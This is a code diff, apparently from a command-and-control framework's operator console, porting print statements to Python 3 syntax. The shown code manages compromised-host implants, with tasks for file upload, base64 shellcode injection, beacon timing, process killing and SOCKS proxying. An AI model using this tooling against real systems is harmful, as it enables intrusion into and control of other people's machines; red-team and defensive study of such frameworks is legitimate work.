@@ -121,7 +121,7 @@ def load_file( location ):
     file = open((location), "rb") 
     fr = file.read()
   except Exception as e:
-    print "Error loading file %s" % e
+    print ("Error loading file %s" % e)
   
   if fr:
     return fr
@@ -157,11 +157,11 @@ def startup(printhelp = ""):
     else:
       os.system('clear')
   except Exception as e:
-    print "cls"
-    print chr(27) + "[2J"
-  print Colours.GREEN,""
-  print logo
-  print Colours.END,""
+    print ("cls")
+    print (chr(27) + "[2J")
+  print (Colours.GREEN + "")
+  print (logopic)
+  print (Colours.END + "")
 
   try:
     ii = get_implants()
@@ -187,18 +187,18 @@ def startup(printhelp = ""):
         nowplus60 = now - timedelta(minutes=59)
         
         if nowplus60 > LastSeenTime:
-          print Colours.RED,"[%s]: Seen:%s | PID:%s | S:%s | %s @ %s (%s) %s" % (ID, LastSeen, PID.ljust(5), Sleep, DomainUser, Hostname, Arch, Pivot)
+          print (Colours.RED + "[%s]: Seen:%s | PID:%s | S:%s | %s @ %s (%s) %s" % (ID, LastSeen, PID.ljust(5), Sleep, DomainUser, Hostname, Arch, Pivot))
         elif nowplus10 > LastSeenTime:
-          print Colours.YELLOW,"[%s]: Seen:%s | PID:%s | S:%s | %s @ %s (%s) %s" % (ID, LastSeen, PID.ljust(5), Sleep, DomainUser, Hostname, Arch, Pivot)
+          print (Colours.YELLOW + "[%s]: Seen:%s | PID:%s | S:%s | %s @ %s (%s) %s" % (ID, LastSeen, PID.ljust(5), Sleep, DomainUser, Hostname, Arch, Pivot))
         else:
-          print Colours.GREEN,"[%s]: Seen:%s | PID:%s | S:%s | %s @ %s (%s) %s" % (ID, LastSeen, PID.ljust(5), Sleep, DomainUser, Hostname, Arch, Pivot)
+          print (Colours.GREEN + "[%s]: Seen:%s | PID:%s | S:%s | %s @ %s (%s) %s" % (ID, LastSeen, PID.ljust(5), Sleep, DomainUser, Hostname, Arch, Pivot))
     else:
       from datetime import datetime, timedelta
       now = datetime.now()
-      print Colours.RED,"No Implants as of: %s" % now.strftime("%m/%d/%Y %H:%M:%S")
-    print Colours.END,""
+      print (Colours.RED+"No Implants as of: %s" % now.strftime("%m/%d/%Y %H:%M:%S"))
+    print (Colours.END+"")
     if printhelp:
-      print printhelp
+      print (printhelp)
 
     t = tabCompleter()
     t.createListCompleter(PRECOMMANDS)
@@ -214,7 +214,7 @@ def startup(printhelp = ""):
           pass
 
     implant_id = raw_input("Select ImplantID or ALL or Comma Separated List (Enter to refresh):: ")
-    print ""
+    print ("")
 
     if implant_id:
       try:
@@ -368,11 +368,14 @@ def startup(printhelp = ""):
 
     commandloop(implant_id)
   except Exception as e:
-    traceback.print_exc()
-    print "Error: %s" % e
-    print "Currently no valid implants: sleeping for 10 seconds"
-    time.sleep(10)
-    startup()
+    if 'unable to open database file' in e:
+      startup()
+    else:
+      traceback.print_exc()
+      print ("Error: %s" % e)
+      print ("Currently no valid implants: sleeping for 10 seconds")
+      time.sleep(10)
+      startup()
 
 def runcommand(command, randomuri): 
   if command:
@@ -404,7 +407,7 @@ def runcommand(command, randomuri):
           command = command.replace('m', '')
           command = (int(command)) * 60
       except Exception as e:
-        print "Error setting beacon: %s" % e
+        print ("Error setting beacon: %s" % e)
 
       sleep = '$sleeptime = %s' % command
       update_sleep(command, randomuri)
@@ -416,7 +419,7 @@ def runcommand(command, randomuri):
       helpfull = string.split(py_help1, '\n')
       for line in helpfull:
         if searchterm in line:
-          print line
+          print (line)
     
     elif "unhide-implant" in command.lower():
       unhide_implant(randomuri)
@@ -439,16 +442,16 @@ def runcommand(command, randomuri):
             source = base64.b64encode(s)
         if s:
           destination = args.destination.replace("\\","\\\\")
-          print ""
-          print "Uploading %s to %s" % (args.source, destination)
+          print ("")
+          print ("Uploading %s to %s" % (args.source, destination))
           uploadcommand = "upload-file \"%s\":%s" % (destination, source)
           new_task(uploadcommand, randomuri)
       except Exception as e:
-        print "Error with source file: %s" % e   
+        print ("Error with source file: %s" % e   )
         traceback.print_exc()  
 
     elif command.lower() == "help" or command == "?" or command.lower() == "help ":
-      print py_help1
+      print (py_help1)
 
     elif "loadmoduleforce" in command.lower():
       params = re.compile("loadmoduleforce ", re.IGNORECASE)
@@ -468,7 +471,7 @@ def runcommand(command, randomuri):
       impid = get_implantdetails(randomuri)
       ri = raw_input("Are you sure you want to terminate the implant ID %s? (Y/n) " % impid[0])
       if ri.lower() == "n":
-        print "Implant not terminated"
+        print ("Implant not terminated")
       if ri == "":
         pid = get_pid(randomuri)
         new_task("kill -9 %s" % pid,randomuri)
@@ -490,7 +493,7 @@ def runcommand(command, randomuri):
     try:
       check_module_loaded("Implant-Core.ps1", randomuri)
     except Exception as e:
-      print "Error loading Implant-Core.ps1: %s" % e
+      print ("Error loading Implant-Core.ps1: %s" % e)
 
     run_autoloads(command, randomuri)
 
@@ -508,7 +511,7 @@ def runcommand(command, randomuri):
       helpfull = string.split(posh_help, '\n')
       for line in helpfull:
         if searchterm in line:
-          print line
+          print (line)
 
     elif (command == "back") or (command == "clear") or (command == "back ") or (command == "clear "):
       startup()
@@ -752,28 +755,28 @@ def runcommand(command, randomuri):
       new_task(pscommand, randomuri)
 
     elif command.lower() == "help" or command == "?" or command.lower() == "help ":
-      print posh_help
+      print (posh_help)
     elif command.lower() == "help 1":
-      print posh_help1
+      print (posh_help1)
     elif command.lower() == "help 2":
-      print posh_help2
+      print (posh_help2)
     elif command.lower() == "help 3":
-      print posh_help3
+      print (posh_help3)
     elif command.lower() == "help 4":
-      print posh_help4
+      print (posh_help4)
     elif command.lower() == "help 5":
-      print posh_help5  
+      print (posh_help5)  
     elif command.lower() == "help 6":
-      print posh_help6
+      print (posh_help6)
     elif command.lower() == "help 7":
-      print posh_help7
+      print (posh_help7)
     elif command.lower() == "help 8":
-      print posh_help8   
+      print (posh_help8)   
 
 
     elif "get-pid" in command.lower():
       pid = get_implantdetails(randomuri)
-      print pid[8]
+      print (pid[8])
 
     elif "upload-file" in command.lower():
       source = ""
@@ -787,19 +790,19 @@ def runcommand(command, randomuri):
             source = base64.b64encode(s)
         if s:
           destination = args.destination.replace("\\","\\\\")
-          print ""
-          print "Uploading %s to %s" % (args.source, destination)
+          print ("")
+          print ("Uploading %s to %s" % (args.source, destination))
           uploadcommand = "Upload-File -Destination \"%s\" -Base64 %s" % (destination, source)
           new_task(uploadcommand, randomuri)
       except Exception as e:
-        print "Error with source file: %s" % e   
+        print ("Error with source file: %s" % e)   
         traceback.print_exc()      
 
     elif "kill-implant" in command.lower() or "exit" in command.lower():
       impid = get_implantdetails(randomuri)
       ri = raw_input("Are you sure you want to terminate the implant ID %s? (Y/n) " % impid[0])
       if ri.lower() == "n":
-        print "Implant not terminated"
+        print ("Implant not terminated")
       if ri == "":
         new_task("exit", randomuri)
         kill_implant(randomuri)
@@ -832,7 +835,7 @@ def runcommand(command, randomuri):
       check_module_loaded("Invoke-DaisyChain.ps1", randomuri)
       urls = get_allurls()
       new_task("%s -URLs '%s'" % (command,urls), randomuri)
-      print "Now use createdaisypayload"
+      print ("Now use createdaisypayload")
 
     elif "inject-shellcode" in command.lower():
     #elif (command.lower() == "inject-shellcode") or (command.lower() == "inject-shellcode "):
@@ -851,14 +854,14 @@ def runcommand(command, randomuri):
           new_task("$Shellcode%s=\"%s\"" % (arch,base64.b64encode(shellcodefile)), randomuri)  
           new_task("Inject-Shellcode -Shellcode ([System.Convert]::FromBase64String($Shellcode%s))%s" % (arch, params), randomuri)
       except Exception as e:
-        print "Error loading file: %s" % e
+        print ("Error loading file: %s" % e)
 
     elif "listmodules" in command.lower():    
-      print os.listdir("%s/Modules/" % POSHDIR)
+      print (os.listdir("%s/Modules/" % POSHDIR))
 
     elif "modulesloaded" in command.lower():    
       ml = get_implantdetails(randomuri)
-      print ml[14]
+      print (ml[14])
 
     elif (command.lower() == "ps") or (command.lower() == "ps "):
       new_task("get-processfull", randomuri)
@@ -877,8 +880,8 @@ def runcommand(command, randomuri):
       sharpurls = get_sharpurls()
       sharpurl = select_item("HostnameIP", "C2Server")
       new_task("Sharpsocks -Client -Uri %s -Channel %s -Key %s -URLs %s -Insecure -Beacon 2000" % (sharpurl,channel,sharpkey,sharpurls), randomuri)
-      print "git clone https://github.com/nettitude/SharpSocks.git"
-      print "SharpSocksServerTestApp.exe -c %s -k %s -l http://IPADDRESS:8080" % (channel,sharpkey)
+      print ("git clone https://github.com/nettitude/SharpSocks.git")
+      print ("SharpSocksServerTestApp.exe -c %s -k %s -l http://IPADDRESS:8080" % (channel,sharpkey))
 
     elif (command.lower() == "history") or command.lower() == "history ":
       startup(get_history())
@@ -913,7 +916,7 @@ def commandloop(implant_id):
       readline.parse_and_bind("tab: complete")
       readline.set_completer(t.listCompleter)
       if ("-" in implant_id.lower()) or ("all" in implant_id.lower()) or ("," in implant_id.lower()):
-        print Colours.GREEN
+        print (Colours.GREEN)
         command = raw_input("%s> " % (implant_id))
       else:
         hostname = get_hostdetails(implant_id)
@@ -922,8 +925,8 @@ def commandloop(implant_id):
           readline.set_completer_delims('\t')
           readline.parse_and_bind("tab: complete")
           readline.set_completer(t.listCompleter)
-        print Colours.GREEN
-        print "%s @ %s (PID:%s)" % (hostname[11],hostname[3],hostname[8])
+        print (Colours.GREEN)
+        print ("%s @ %s (PID:%s)" % (hostname[11],hostname[3],hostname[8]))
         command = raw_input("%s> " % (implant_id))
 
       # if "all" run through all implants get_implants()
@@ -948,7 +951,7 @@ def commandloop(implant_id):
             implant_id = get_randomuri(implant_id)
             runcommand(command, implant_id)
           except Exception as e:
-            print "Unknown ImplantID"
+            print ("Unknown ImplantID")
       # else run against single uri    
       else:
         implant_id = get_randomuri(implant_id)
@@ -958,8 +961,8 @@ def commandloop(implant_id):
       commandloop(implant_id_orig)
 
     except Exception as e:
-      print Colours.RED
-      print "Error running against the selected implant ID, ensure you have typed the correct information"
+      print (Colours.RED)
+      print ("Error running against the selected implant ID, ensure you have typed the correct information")
       #print Colours.END
       #traceback.print_exc()
       #print "Error: %s" % e
